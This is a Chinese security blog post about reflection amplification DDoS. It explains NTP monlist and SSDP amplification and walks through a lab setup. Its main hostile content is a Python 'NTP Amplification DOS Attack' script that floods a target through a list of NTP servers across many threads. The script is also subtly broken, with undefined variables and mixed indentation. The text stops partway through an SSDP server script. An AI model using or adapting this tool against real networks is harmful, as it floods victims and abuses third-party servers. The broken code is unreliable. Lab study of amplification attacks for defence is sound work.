<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>反射放大DDoS | Fr4nk404</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">反射放大DDoS</h1><a id="logo" href="/.">Fr4nk404</a><p class="description">Fr4nk404's Bl0g</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/tags/"><i class="fa fa-tags"> 标签</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">反射放大DDoS</h1><div class="post-meta">Oct 25, 2020<span> | </span><span class="category"><a href="/categories/Security/">Security</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" data-disqus-identifier="2020/10/25/反射放大DDos/" href="/2020/10/25/反射放大DDos/#disqus_thread"></a><div class="post-content"><p>最近遇到反射放大攻击的需求，这里简要介绍下相关的攻击类型及实验过程。</p>
<h2 id="NTP反射放大攻击"><a href="#NTP反射放大攻击" class="headerlink" title="NTP反射放大攻击"></a>NTP反射放大攻击</h2><p>DDoS攻击是一种耗尽资源的网络攻击方式，攻击者通过流量攻击，有针对性的漏洞攻击等耗尽目标主机的资源来达到拒绝服务的目的。</p>
<p>反射放大攻击是一种具有巨大攻击力的DDoS攻击方式。攻击者只需要付出少量的代价，即可对需要攻击的目标产生巨大的流量，对网络带宽资源（网络层）、连接资源（传输层）和计算机资源（应用层）造成巨大的压力.反射放大攻击主要是利用回复包比请求包大的特点，放大流量，伪造请求包的源IP地址为受害者IP，将应答包的流量引入受害的服务器。</p>
<h3 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><h3 id="0x00-NTP及NTP反射放大攻击"><a href="#0x00-NTP及NTP反射放大攻击" class="headerlink" title="0x00 NTP及NTP反射放大攻击"></a>0x00 NTP及NTP反射放大攻击</h3><h4 id="1-NTP"><a href="#1-NTP" class="headerlink" title="1. NTP"></a>1. NTP</h4><p>NTP是网络时间协议(Network Time Protocol)，它是用来同步网络中各个计算机的时间的协议。它的用途是把计算机的时钟同步到世界协调时UTC，其精度在局域网内可达0.1ms，在互联网上绝大多数的地方其精度可以达到1-50ms。它可以使计算机对其服务器或时钟源（如石英钟，GPS等等）进行时间同步，它可以提供高精准度的时间校正，而且可以使用加密确认的方式来防止病毒的协议攻击。</p>
<h4 id="2-NTP反射放大攻击"><a href="#2-NTP反射放大攻击" class="headerlink" title="2. NTP反射放大攻击"></a>2. NTP反射放大攻击</h4><p>由于NTP是基于UDP协议的，UDP协议面向无连接，客户端发送请求包的源 IP 很容易进行伪造。当把源 IP 修改为受害者的 IP，最终服务端返回的响应包就会返回到受害者的 IP。这就形成了一次反射攻击。</p>
<p>NTP反射放大攻击是一种分布式拒绝服务（DDoS）攻击，其中攻击者利用网络时间协议（NTP）服务器功能，以便用一定数量的UDP流量压倒目标网络或服务器，使常规流量无法访问目标及其周围的基础设施。</p>
<p>标准NTP 服务提供了一个 monlist查询功能，也被称为MON_GETLIST，该功能主要用于监控 NTP 服务器的服务状况，当用户端向NTP服务提交monlist查询时，NTP 服务器会向查询端返回与NTP 服务器进行过时间同步的最后 600 个客户端的 IP，响应包按照每 6 个 IP 进行分割，最多有 100 个响应包。由于NTP服务使用UDP协议，攻击者可以伪造源发地址向NTP服务进行monlist查询，这将导致NTP服务器向被伪造的目标发送大量的UDP数据包，理论上这种恶意导向的攻击流量可以放大到伪造查询流量的100倍。</p>
<p>NTP放大攻击可以分为四个步骤：</p>
<ol>
<li>攻击者使用僵尸网络，将带有欺骗IP地址的UDP数据包发送到启用了monlist命令的NTP服务器。每个数据包上的欺骗IP地址指向受害者的真实IP地址。</li>
<li>每个UDP数据包使用其monlist命令向NTP服务器发出请求，从而产生大量响应。</li>
<li>服务器使用结果数据，响应欺骗地址。</li>
<li>目标的IP地址接收响应，周围的网络基础设施因流量泛滥而变得不堪重负，导致拒绝服务。</li>
</ol>
<h3 id="0x01-NTP环境搭建"><a href="#0x01-NTP环境搭建" class="headerlink" title="0x01 NTP环境搭建"></a>0x01 NTP环境搭建</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><ol>
<li>安装NTP服务器：<code>yum install -y ntp</code></li>
<li>配置/etc/ntp.conf<br>配置如下：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"># For more information about this file, see the man pages</span><br><span class="line"># ntp.conf(5), ntp_acc(5), ntp_auth(5), ntp_clock(5), ntp_misc(5), ntp_mon(5).</span><br><span class="line"></span><br><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line"></span><br><span class="line"># Permit time synchronization with our time source, but do not</span><br><span class="line"># permit the source to query or modify the service on this system.</span><br><span class="line">restrict default nomodify notrap nopeer noquery</span><br><span class="line"></span><br><span class="line"># Permit all access over the loopback interface.  This could</span><br><span class="line"># be tightened as well, but to do so would effect some of</span><br><span class="line"># the administrative functions.</span><br><span class="line">restrict 127.0.0.1 </span><br><span class="line">restrict ::1</span><br><span class="line"></span><br><span class="line"># Hosts on local network are less restricted.</span><br><span class="line">#restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"></span><br><span class="line"># Use public servers from the pool.ntp.org project.</span><br><span class="line"># Please consider joining the pool (http://www.pool.ntp.org/join.html).</span><br><span class="line"></span><br><span class="line">server 0.centos.pool.ntp.org iburst</span><br><span class="line">server 1.centos.pool.ntp.org iburst</span><br><span class="line">server 2.centos.pool.ntp.org iburst</span><br><span class="line">server 3.centos.pool.ntp.org iburst</span><br><span class="line"></span><br><span class="line">#broadcast 192.168.1.255 autokey	# broadcast server</span><br><span class="line">#broadcastclient			# broadcast client</span><br><span class="line">#broadcast 224.0.1.1 autokey		# multicast server</span><br><span class="line">#multicastclient 224.0.1.1		# multicast client</span><br><span class="line">#manycastserver 239.255.254.254		# manycast server</span><br><span class="line">#manycastclient 239.255.254.254 autokey # manycast client</span><br><span class="line"></span><br><span class="line"># Enable public key cryptography.</span><br><span class="line">#crypto</span><br><span class="line"></span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line"></span><br><span class="line"># Key file containing the keys and key identifiers used when operating</span><br><span class="line"># with symmetric key cryptography. </span><br><span class="line">keys /etc/ntp/keys</span><br><span class="line"></span><br><span class="line"># Specify the key identifiers which are trusted.</span><br><span class="line">#trustedkey 4 8 42</span><br><span class="line"></span><br><span class="line"># Specify the key identifier to use with the ntpdc utility.</span><br><span class="line">#requestkey 8</span><br><span class="line"></span><br><span class="line"># Specify the key identifier to use with the ntpq utility.</span><br><span class="line">#controlkey 8</span><br><span class="line"></span><br><span class="line"># Enable writing of statistics records.</span><br><span class="line">#statistics clockstats cryptostats loopstats peerstats</span><br><span class="line"></span><br><span class="line"># Disable the monitoring facility to prevent amplification attacks using ntpdc</span><br><span class="line"># monlist command when default restrict does not include the noquery flag. See</span><br><span class="line"># CVE-2013-5211 for more details.</span><br><span class="line"># Note: Monitoring will not be disabled with the limited restriction flag.</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>服务开启、测试</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ntpd</span><br><span class="line">chkconfig ntpd on</span><br><span class="line">ntpstat <span class="comment">#查看状态</span></span><br></pre></td></tr></table></figure>
<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>查看路由，并调整为服务端可达，安装环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vim</span><br><span class="line">yum install -y ntp</span><br></pre></td></tr></table></figure>
<p>修改<code>/etc/ntp.conf</code>如下：</p>
<p><img src="/2020/10/25/反射放大DDos/1.png" alt="client_conf"></p>
<p>配置测试，测试成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdc -n -c monlist 192.168.20.16</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/25/反射放大DDos/2.png" alt="config_test"></p>
<h3 id="0x02-反射放大攻击"><a href="#0x02-反射放大攻击" class="headerlink" title="0x02 反射放大攻击"></a>0x02 反射放大攻击</h3><h4 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置环境</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/secdev/scapy.git</span><br><span class="line"><span class="built_in">cd</span> ~/scapy</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<p>编写攻击脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deny</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> ntplist</span><br><span class="line">	<span class="keyword">global</span> current_server</span><br><span class="line">	<span class="keyword">global</span> data</span><br><span class="line">	<span class="keyword">global</span> target</span><br><span class="line">	ntpserver = ntplist[current_server] </span><br><span class="line">	currentserver = current_server + <span class="number">1</span> </span><br><span class="line">	conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    conn.settimeout(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    	<span class="comment"># ntp 123</span></span><br><span class="line">        conn.connect((ip, port))</span><br><span class="line">        print(<span class="string">"connected%s, %d"</span>%(ip, port))</span><br><span class="line">        conn.sendall(<span class="string">b'\x17\x00\x02\x2a'</span>+<span class="string">b'\x00'</span>*<span class="number">4</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        data_lens = <span class="number">0</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = conn.recv(<span class="number">15000</span>)</span><br><span class="line">                flag =<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> len(data):</span><br><span class="line">                        data_lens+=len(data)+<span class="number">42</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag ==<span class="number">1</span>:</span><br><span class="line">            log_addr(ip, port,data_lens)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printhelp</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"NTP Amplification DOS Attack"</span></span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">		printhelp()</span><br><span class="line">	target = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> target <span class="keyword">in</span> (<span class="string">"help"</span>,<span class="string">"-h"</span>,<span class="string">"h"</span>,<span class="string">"?"</span>,<span class="string">"--h"</span>,<span class="string">"--help"</span>,<span class="string">"/?"</span>):</span><br><span class="line">		printhelp()</span><br><span class="line"></span><br><span class="line">	ntpserverfile = sys.argv[<span class="number">2</span>]</span><br><span class="line">	numberthreads = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">	<span class="comment">#System for accepting bulk input</span></span><br><span class="line">	ntplist = []</span><br><span class="line">	currentserver = <span class="number">0</span></span><br><span class="line">	<span class="keyword">with</span> open(ntpserverfile) <span class="keyword">as</span> f:</span><br><span class="line">	    ntplist = f.readlines()</span><br><span class="line"></span><br><span class="line">	<span class="comment">#Make sure we dont out of bounds</span></span><br><span class="line">	<span class="keyword">if</span>  numberthreads &gt; int(len(ntplist)):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Attack Aborted: More threads than servers"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Next time dont create more threads than servers"</span></span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	data = <span class="string">b"\x17\x00\x03\x2a"</span> + <span class="string">b"\x00"</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">	threads = []</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Starting to flood: "</span>+ target + <span class="string">" using NTP list: "</span> + ntpserverfile + <span class="string">" With "</span> + str(numberthreads) + <span class="string">" threads"</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Use CTRL+C to stop attack"</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> n <span class="keyword">in</span> range(numberthreads):</span><br><span class="line">	    thread = threading.Thread(target=deny)</span><br><span class="line">	    thread.daemon = <span class="literal">True</span></span><br><span class="line">	    thread.start()</span><br><span class="line"></span><br><span class="line">	    threads.append(thread)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#In progress!</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Sending..."</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">	print(<span class="string">"Script Stopped [ctrl + c]... Shutting down"</span>)</span><br></pre></td></tr></table></figure></p>
<p>攻击机：</p>
<p><img src="/2020/10/25/反射放大DDos/3.png" alt="attack"></p>
<p>服务器不断刷新攻击包：</p>
<p><img src="/2020/10/25/反射放大DDos/4.png" alt="success"></p>
<h2 id="SSDP反射放大攻击"><a href="#SSDP反射放大攻击" class="headerlink" title="SSDP反射放大攻击"></a>SSDP反射放大攻击</h2><h3 id="实验环境搭建-1"><a href="#实验环境搭建-1" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><h3 id="0x00-SSDP反射放大攻击"><a href="#0x00-SSDP反射放大攻击" class="headerlink" title="0x00 SSDP反射放大攻击"></a>0x00 SSDP反射放大攻击</h3><p>SSDP攻击是一种基于反射的分布式拒绝服务(DDoS)攻击，它利用通用即插即用(UPnP)网络协议向目标受害者发送放大的流量，以致目标受害者的基础设施和其Web资源脱机。</p>
<p>SSDP DDoS攻击的6个步骤：</p>
<ol>
<li>首先，攻击者进行扫描，寻找可以用作放大因子的即插即用设备。</li>
<li>随着攻击者发现联网设备，他们将创建所有响应设备的列表。</li>
<li>攻击者使用目标受害者的欺骗IP地址创建UDP数据包。</li>
<li>然后，攻击者使用僵尸网络通过设置某些标志(特别是ssdp：rootdevice或ssdp：all)，向每个即插即用设备发送一个欺骗性发现数据包，并请求更多数据。</li>
<li>结果，每个设备将向目标受害者发送回复，其数据量最多是攻击者请求的30倍。</li>
<li>然后目标服务器从所有设备接收大量流量，并且不堪重负，有可能导致对合法流量的拒绝服务。</li>
</ol>
<h3 id="0x01-SSDP环境搭建"><a href="#0x01-SSDP环境搭建" class="headerlink" title="0x01 SSDP环境搭建"></a>0x01 SSDP环境搭建</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><ol>
<li>构造服务端脚本<code>ssdp_server.py</code>，使用网段网卡eth1用于测试。</li>
</ol>
<p>三方库安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install netifaces</span><br><span class="line">pip3 install pydevd</span><br></pre></td></tr></table></figure>
<p>服务端测试脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line">import uuid</span><br><span class="line">import netifaces as ni</span><br><span class="line">import logging</span><br><span class="line">import threading</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">import socket</span><br><span class="line">import logging</span><br><span class="line">from time import sleep</span><br><span class="line">from email.utils import formatdate</span><br><span class="line">from errno import ENOPROTOOPT</span><br><span class="line">from http.server import BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line">SSDP_PORT = 1900</span><br><span class="line">SSDP_ADDR = &apos;239.255.255.250&apos;</span><br><span class="line">SERVER_ID = &apos;ZeWaren example SSDP Server&apos;</span><br><span class="line">NETWORK_INTERFACE = &apos;eth1&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line"></span><br><span class="line">class SSDPServer:</span><br><span class="line">    &quot;&quot;&quot;A class implementing a SSDP server.  The notify_received and</span><br><span class="line">    searchReceived 